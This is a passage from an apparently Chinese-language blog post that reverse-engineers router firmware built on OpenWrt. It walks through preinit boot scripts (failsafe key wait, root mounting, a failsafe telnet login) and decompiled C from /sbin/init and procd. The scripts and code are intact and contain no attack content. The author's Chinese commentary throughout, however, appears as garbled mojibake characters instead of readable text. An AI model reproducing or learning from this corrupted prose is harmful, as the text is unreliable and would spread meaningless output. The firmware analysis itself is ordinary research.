class="line">[ -n &quot;$timeout&quot; ] || timeout=1</span><br><span class="line">[ $timeout -ge 1 ] || timeout=1</span><br><span class="line">timer=$timeout</span><br><span class="line">lock $keypress_wait</span><br><span class="line">&#123;</span><br><span class="line">while [ $timer -gt 0 ]; do</span><br><span class="line">echo &quot;$timer&quot; &gt;$keypress_sec</span><br><span class="line">timer=$(($timer - 1))</span><br><span class="line">sleep 1</span><br><span class="line">done</span><br><span class="line">lock -u $keypress_wait</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">&#125; &amp;</span><br><span class="line"></span><br><span class="line">echo &quot;Press the [$1] key and hit [enter] $2&quot;</span><br><span class="line">echo &quot;Press the [1], [2], [3] or [4] key and hit [enter] to select the debug level&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">if we&#x27;</span>re on the console we <span class="built_in">wait</span> <span class="keyword">for</span> input</span></span><br><span class="line">&#123;</span><br><span class="line">while [ -r $keypress_wait ]; do</span><br><span class="line">timer=&quot;$(cat $keypress_sec)&quot;</span><br><span class="line"></span><br><span class="line">[ -n &quot;$timer&quot; ] || timer=1</span><br><span class="line">timer=&quot;$&#123;timer%%\ *&#125;&quot;</span><br><span class="line">[ $timer -ge 1 ] || timer=1</span><br><span class="line">do_keypress=&quot;&quot;</span><br><span class="line">&#123;</span><br><span class="line">read -t &quot;$timer&quot; do_keypress</span><br><span class="line">case &quot;$do_keypress&quot; in</span><br><span class="line">$1)</span><br><span class="line">echo &quot;true&quot; &gt;$keypress_true</span><br><span class="line">;;</span><br><span class="line">1 | 2 | 3 | 4)</span><br><span class="line">echo &quot;$do_keypress&quot; &gt;/tmp/debug_level</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">continue;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">lock -u $keypress_wait</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">&#125;</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">lock -w $keypress_wait</span><br><span class="line"></span><br><span class="line">keypressed=1</span><br><span class="line">[ &quot;$(cat $keypress_true)&quot; = &quot;true&quot; ] &amp;&amp; keypressed=0</span><br><span class="line"></span><br><span class="line">rm -f $keypress_true</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">rm -f $keypress_sec</span><br><span class="line"></span><br><span class="line">return $keypressed</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">failsafe_wait() &#123;</span><br><span class="line">        local is_failsafe=$(uci get system.@system[0].failsafe)</span><br><span class="line">        echo &quot;is_failsafe is $is_failsafe&quot; &gt; /dev/console</span><br><span class="line">        if [ $is_failsafe = &quot;true&quot; ]; then </span><br><span class="line">                FAILSAFE=</span><br><span class="line">        grep -q &#x27;failsafe=&#x27; /proc/cmdline &amp;&amp; FAILSAFE=true &amp;&amp; export FAILSAFE</span><br><span class="line">        if [ &quot;$FAILSAFE&quot; != &quot;true&quot; ]; then</span><br><span class="line">                pi_failsafe_net_message=true</span><br><span class="line">                preinit_net_echo &quot;Please press button now to enter failsafe&quot;</span><br><span class="line">                pi_failsafe_net_message=false</span><br><span class="line">                fs_wait_for_key f &#x27;to enter failsafe mode&#x27; $fs_failsafe_wait_timeout &amp;&amp; FAILSAFE=true</span><br><span class="line">                       [ -f &quot;/tmp/failsafe_button&quot; ] &amp;&amp; FAILSAFE=true &amp;&amp; echo &quot;- failsafe button &quot;`cat /tmp/failsafe_button`&quot; was pressed -&quot;</span><br><span class="line">                [ &quot;$FAILSAFE&quot; = &quot;true&quot; ] &amp;&amp; export FAILSAFE &amp;&amp; touch /tmp/failsafe</span><br><span class="line">        fi</span><br><span class="line"></span><br><span class="line">        fi </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main failsafe_wait</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006-2010 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">run_failsafe_hook() &#123;</span><br><span class="line">    if [ &quot;$FAILSAFE&quot; = &quot;true&quot; ]; then</span><br><span class="line">boot_run_hook failsafe</span><br><span class="line">lock -w /tmp/.failsafe</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main run_failsafe_hook</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">indicate_regular_preinit() &#123;</span><br><span class="line">preinit_net_echo &quot;Continuing with Regular Preinit\n&quot;</span><br><span class="line">pi_indicate_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main indicate_regular_preinit</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">initramfs_test() &#123;</span><br><span class="line">if [ -n &quot;$INITRAMFS&quot; ]; then</span><br><span class="line">boot_run_hook initramfs</span><br><span class="line">preinit_ip_deconfig</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main initramfs_test</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">do_mount_root() &#123;</span><br><span class="line">ramoverlay</span><br><span class="line">find_mount_jffs2</span><br><span class="line">    rootfs_init_etc_ramfs</span><br><span class="line">boot_run_hook preinit_mount_root</span><br><span class="line"></span><br><span class="line">defFlag=`grep -o Default /tmp/userconfig/userconfig_default.tmp`</span><br><span class="line">if [ -n &quot;$defFlag&quot; ] &amp;&amp; [ $defFlag = &#x27;Default&#x27; ];</span><br><span class="line">then</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">set</span> dftmac from tddp flash</span></span><br><span class="line">/usr/bin/tddpd dftmac</span><br><span class="line">/lib/cfg_save/config.sh save</span><br><span class="line">else</span><br><span class="line">   echo &quot;no&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[ &quot;$INITRAMFS&quot; = &quot;1&quot; ] || boot_hook_add preinit_main do_mount_root</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">failsafe_netlogin () &#123;</span><br><span class="line">telnetd -l /bin/login.sh &lt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">failsafe_shell() &#123;</span><br><span class="line">lock /tmp/.failsafe</span><br><span class="line">ash --login</span><br><span class="line">echo &quot;Please reboot system when done with failsafe network logins&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add failsafe failsafe_netlogin</span><br><span class="line">boot_hook_add failsafe failsafe_shell</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">run_init() &#123;</span><br><span class="line">preinit_ip_deconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main run_init</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œpreinit_essentialï¼Œè€Œpreinit_essentialä¸­å•¥ä¹Ÿæ²¡æœ‰ï¼Œå› æ­¤ä»€ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Ÿï¼Ÿ</p><p>ä¹‹åæ‰§è¡Œpreinit_mainï¼Œpreinit_mainä¸­æœ‰<strong>define_default_set_state</strong>ï¼Œ<strong>do_ipq806x</strong>ï¼Œ<strong>preinit_ip</strong>ï¼Œ<strong>pi_indicate_preinit</strong>ï¼Œ<strong>failsafe_wait</strong>ï¼Œ<strong>run_failsafe_hook</strong>ï¼Œ<strong>indicate_regular_preinit</strong>ï¼Œ<strong>initramfs_test</strong>ï¼Œ<strong>do_mount_root</strong>ï¼Œ<strong>run_init</strong>å‡½æ•°ï¼Œåˆ†åˆ«æ‰§è¡Œå¦‚ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">define_default_set_state</span>() &#123;</span><br><span class="line">. /etc/diag.sh</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ&#x2F;etc&#x2F;diag.shï¼Œ<code>set_state() &#123; :; &#125;</code>default set</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_ipq806x() &#123;</span><br><span class="line">. /lib/ipq806x.sh</span><br><span class="line"></span><br><span class="line">ipq806x_board_detect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œipq806x.shè„šæœ¬ä¸­çš„**<code>ipq806x_board_detect</code>**å‡½æ•°ï¼Œä½œç”¨ï¼šè¯»å–æ¿å­çš„ä¿¡æ¯å¹¶è®°å½•</p><p><strong><code>preinit_ip</code></strong> å‡½æ•°</p><ul><li><strong>æ¥å£é€‰æ‹©</strong>ï¼š<ul><li>å¦‚æœ <code>pi_ifname</code> æœªè®¾ç½®ï¼Œåˆ™ä½¿ç”¨ <code>ifname</code>ã€‚</li></ul></li><li><strong>é…ç½®æ¥å£</strong>ï¼š<ul><li>æ£€æŸ¥æ¥å£æ˜¯å¦å­˜åœ¨äº <code>/proc/net/dev</code>ã€‚</li><li>ä½¿ç”¨ <code>ifconfig</code> å‘½ä»¤é…ç½®æ¥å£çš„ IP åœ°å€ã€å­ç½‘æ©ç å’Œå¹¿æ’­åœ°å€ï¼Œå¹¶æ¿€æ´»æ¥å£ã€‚</li></ul></li></ul><p>**<code>pi_indicate_preinit</code>**ï¼šè¾“å‡ºå¹¶äº®ç¯é¢„ç¤ºåˆå§‹åŒ–çš„çŠ¶æ€ï¼Œæƒ³æ¥å¯åŠ¨è·¯ç”±å™¨çš„æ—¶å€™çš„äº®ç¯ç”±æ­¤è€Œæ¥</p><p><strong><code>failsafe_wait</code></strong> å‡½æ•°ï¼šæ£€æµ‹ç³»ç»Ÿä¸Šæ˜¯å¦åº”è¯¥è¿›å…¥æ•…éšœå®‰å…¨æ¨¡å¼ï¼ˆåœ¨ç»™å®šçš„è¶…æ—¶æ—¶é—´å†…<strong>ç­‰å¾…ç‰¹å®šæŒ‰é”®è¾“å…¥</strong>ï¼Œä»¥è§¦å‘æ•…éšœå®‰å…¨æ¨¡å¼æˆ–è®¾ç½®è°ƒè¯•çº§åˆ«ï¼‰</p><p>**<code>run_failsafe_hook</code> **å‡½æ•°ï¼šæ£€æŸ¥ç³»ç»Ÿæ˜¯å¦è¿›å…¥æ•…éšœå®‰å…¨æ¨¡å¼ï¼Œå¦‚æœè¿›å…¥åˆ™æ‰§è¡Œfailsafeï¼Œå¹¶åˆ›å»ºä¸€ä¸ªé”lock -w &#x2F;tmp&#x2F;.failsafe</p><p>**<code>indicate_regular_preinit</code>**å‡½æ•°ï¼šè¾“å‡ºâ€Continuing with Regular Preinit\nâ€ï¼Œå¹¶å†æ¬¡äº®ç¯</p><p>**<code>initramfs_test</code>**å‡½æ•°ï¼šæ£€æŸ¥ç³»ç»Ÿæ˜¯å¦åœ¨ initramfs æ¨¡å¼ä¸‹è¿è¡Œï¼Œå¹¶æ‰§è¡Œç›¸å…³æ“ä½œ</p><blockquote><p>Initramfs æ¨¡å¼æ˜¯ä¸€ç§ç”¨äºå¼•å¯¼ Linux ç³»ç»Ÿçš„åˆå§‹æ–‡ä»¶ç³»ç»Ÿæ¨¡å¼ã€‚å®ƒé€šå¸¸ç”¨äºåœ¨å†…æ ¸å¯åŠ¨æ—¶æä¾›ä¸€ä¸ªä¸´æ—¶çš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œä»¥ä¾¿åŠ è½½å¿…è¦çš„é©±åŠ¨ç¨‹åºå’Œåˆå§‹åŒ–è„šæœ¬ï¼Œç›´åˆ°çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿå¯ä»¥æŒ‚è½½ä¸ºæ­¢ã€‚ï¼ˆæˆ–è®¸è§£åŠ å¯†è„šæœ¬ä¾¿æ˜¯ä»è¿™é‡Œå¼€å§‹çš„ï¼Ÿï¼Ÿï¼‰</p></blockquote><p>**<code>do_mount_root</code> **å‡½æ•°ï¼šè´Ÿè´£æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿå¹¶è¿›è¡Œç›¸å…³åˆå§‹åŒ–ã€‚</p><p>**<code>run_init</code>**å‡½æ•°ï¼šè¿è¡Œpreinit_ip_deconfigï¼Œè´Ÿè´£å¸è½½ç‰¹å®šç½‘ç»œæ¥å£çš„ IP é…ç½®ã€‚ï¼ˆå¯¹äºé‡ç½®ç½‘ç»œç¯å¢ƒååˆ†é‡è¦ï¼‰</p><p>è‡³æ­¤preinitä¾¿è¿è¡Œå®Œæˆ</p><p>ä¹‹åä¾¿å›åˆ°&#x2F;sbin&#x2F;initä¸­æ‰§è¡Œuloop_run(v1);</p><h3 id="sub-9344"><a href="#sub-9344" class="headerlink" title="sub_9344"></a>sub_9344</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_9344</span><span class="params">(<span class="type">int</span> result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(result + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è®¸æ˜¯å¯¹ä¸‹ä¸€ä¸ªçš„èµ‹å€¼ï¼Ÿï¼Ÿè¦æ±‚ä¸‹ä¸€ä¸ªå‡½æ•°å¿…é¡»åœ¨å­è¿›ç¨‹è¿è¡Œå®Œæ¯•æ‰å¯è¿è¡Œï¼Ÿï¼ˆæ„Ÿè§‰æœ‰é“ç†</p><h3 id="sub-9350"><a href="#sub-9350" class="headerlink" title="sub_9350"></a>sub_9350</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_9350</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// r4</span></span><br><span class="line">  FILE *v1; <span class="comment">// r0</span></span><br><span class="line">  FILE *v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> v4; <span class="comment">// [sp+0h] [bp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">2</span>]; <span class="comment">// [sp+58h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+60h] [bp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>]; <span class="comment">// [sp+64h] [bp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/sbin/procd&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_9BC4</span>();</span><br><span class="line">  <span class="keyword">if</span> ( dword_12488 &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">kill</span>(dword_12488, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">stat</span>(<span class="string">&quot;/tmp/sysupgrade&quot;</span>, &amp;v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">unsetenv</span>(<span class="string">&quot;INITRAMFS&quot;</span>);</span><br><span class="line">  <span class="built_in">unsetenv</span>(<span class="string">&quot;PREINIT&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Exec to real procd now\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Exec to real procd now\n&quot;</span>, <span class="string">&quot;spawn_procd&quot;</span>, <span class="number">66</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;WDTFD&quot;</span>, v0, <span class="number">1</span>);</span><br><span class="line">  v1 = <span class="built_in">fopen</span>(<span class="string">&quot;/tmp/debug_level&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fscanf</span>(v1, <span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/debug_level&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v6 - <span class="number">1</span>) &lt;= <span class="number">3</span> )</span><br><span class="line">      dword_12474 = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_12474 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">2u</span>, <span class="string">&quot;%d&quot;</span>, dword_12474);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DBGLVL&quot;</span>, s, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">execvp</span>(argv[<span class="number">0</span>], argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ç”¨äºæ¸…ç†ç¯å¢ƒã€è®¾ç½®è°ƒè¯•çº§åˆ«ï¼Œå¹¶æœ€ç»ˆå†æ¬¡æ‰§è¡Œ <code>/sbin/procd</code></p><h2 id="sbin-procd-1"><a href="#sbin-procd-1" class="headerlink" title="&#x2F;sbin&#x2F;procd"></a>&#x2F;sbin&#x2F;procd</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">getenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    debug_level = <span class="built_in">atoi</span>(v5);</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getopt</span>(argc, (<span class="type">char</span> *<span class="type">const</span> *)argv, <span class="string">&quot;d:s:h:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">uloop_init</span>();</span><br><span class="line">  v10 = <span class="built_in">sub_A798</span>(v9);</span><br><span class="line">  <span class="built_in">sub_F594</span>(v10);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getpid</span>() == <span class="number">1</span> )</span><br><span class="line">    v11 = <span class="built_in">sub_AE4C</span>();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v11 = <span class="built_in">sub_BD60</span>();</span><br><span class="line">  <span class="built_in">uloop_run</span>(v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰å‚æ•°ï¼Œä¾¿ç›´æ¥breakäº†</p><h3 id="sub-A798"><a href="#sub-A798" class="headerlink" title="sub_A798"></a>sub_A798</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_A798</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">13</span>, (<span class="type">__sighandler_t</span>)<span class="number">1</span>);</span><br><span class="line">  result = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">15</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">10</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">12</span>, &amp;act, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">11</span>, &amp;off_1AA20, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">7</span>, &amp;off_1AA20, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">1</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sigaction</span>(<span class="number">9</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sigaction</span>(<span class="number">19</span>, &amp;off_1AA34, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†æ–¹å¼ï¼Œactæ˜¯shutdownï¼Œ1AA20æ˜¯rebootï¼Œ1AA34æ˜¯æ— æ•ˆè°ƒç”¨</p><p>ç”±äºæ˜¯execvpæ›¿æ¢è¿›ç¨‹è€Œpidæ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œå› æ­¤pidè¿˜æ˜¯1ï¼Œè°ƒç”¨sub_AE4Cå‡½æ•°</p><h3 id="sub-AE4C"><a href="#sub-AE4C" class="headerlink" title="sub_AE4C"></a>sub_AE4C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_AE4C</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Change state %d -&gt; %d\n&quot;</span>, choi, choi + <span class="number">1</span>);</span><br><span class="line">    a1 = <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Change state %d -&gt; %d\n&quot;</span>, <span class="string">&quot;procd_state_next&quot;</span>, <span class="number">90</span>, choi, choi + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++choi;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_AC7C</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-AC7C"><a href="#sub-AC7C" class="headerlink" title="sub_AC7C"></a>sub_AC7C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 